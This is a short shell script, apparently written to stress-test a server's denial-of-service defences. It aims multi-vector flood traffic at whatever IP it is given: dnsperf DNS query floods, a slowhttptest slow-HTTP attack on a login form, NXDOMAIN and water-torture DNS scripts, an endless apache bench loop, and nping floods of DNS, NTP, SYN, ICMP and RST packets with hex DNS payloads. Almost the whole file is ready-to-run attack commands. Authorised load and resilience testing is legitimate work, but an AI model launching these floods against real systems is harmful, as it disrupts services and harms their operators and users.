#!/bin/sh
# Christopher Gray
# Version 0.1.11
#  6-22-18

if [ -z "$1" ]
then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "ES Server is set to $server_ip \r\n"
fi


if [ -z "$2" ]
then
      echo "Defaulting queries to send is set to: 1500 \r\n"
      queries_ps=1500
else
      queries_ps=$2
      #echo "port = $server_port \r\n"
fi


if [ -f queryfile-example-current ]
then
      echo "Loading Nominum sample data file! \r\n \r\n"
else
      echo "Missing Nominum sample data... downloading it!  \r\n \r\n "
      wget -O "queryfile-example-current.gz" "ftp://ftp.nominum.com/pub/nominum/dnsperf/data/queryfile-example-current.gz"
      echo "Decompressing file... \r\n \r\n"
      gunzip queryfile-example-current.gz
      wait
fi

# https://github.com/cobblau/dnsperf
# Dnsperf supports the following command line options:

# -s     Specifies the DNS server's IP address. The default IP is 127.0.0.1.
# -p     Specifies the DNS server's port. The default Port is 53.
# -d     Specifies the input data file. Input data file contains query domain and query type.
# -t     Specifies the timeout for query completion in millisecond. The default timeout is 3000ms.
# -Q     Specifies the max number of queries to be send. The default number is 1000.
# -c     Specifies the number of concurrent queries. The default number is 100. Dnsperf will randomly pick a query domain from data file as QNAME.
# -l     Specifies how long to run tests in seconds. The default number is infinite.
# -e     This will sets the real client IP in query string following the rules defined in edns-client-subnet.

# -i     Specifies interval of queries in seconds. The default number is zero. This option is not supported currently.
# -P     Specifies the transport layer protocol to send DNS queries, udp or tcp. As we know, although UDP is the suggested protocol, DNS queries can be send either by UDP or TCP. The default is udp. tcp is not supported currently, and it is coming soon.
# -f     Specify address family of DNS transport, inet or inet6. The default is inet. inet6 is not supported currently.
# -v     Verbose: report the RCODE of each response on stdout.
# -h     Print the usage of dnsperf.

#little traffic
#sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q 25

#Flood: 
sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q $queries_ps
wait

# Webflow
./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3

#------ Attack traffic ----------
python attack_dns_nxdomain.py $server_ip google.com 10000
./attack_dns_watertorture_wget.sh google.com

#---- apache bench attack ----
while true
do
    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null
done

#-----------------------------------------------------------------------------------------------------------------
RATE=5000
SAMPLES=1000000000
OUTPUT=&>/dev/null
NPING_SILENT='-HNq'
VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"

# A query flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT &
#NX domain flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT &
#NTP flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT &
#SYN Flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT &
#ICMP Flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT &
#RST Flood
nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT &

#-----------------------------------------------------------------------------------------------------------------
echo "DONE \r\n \r\n"
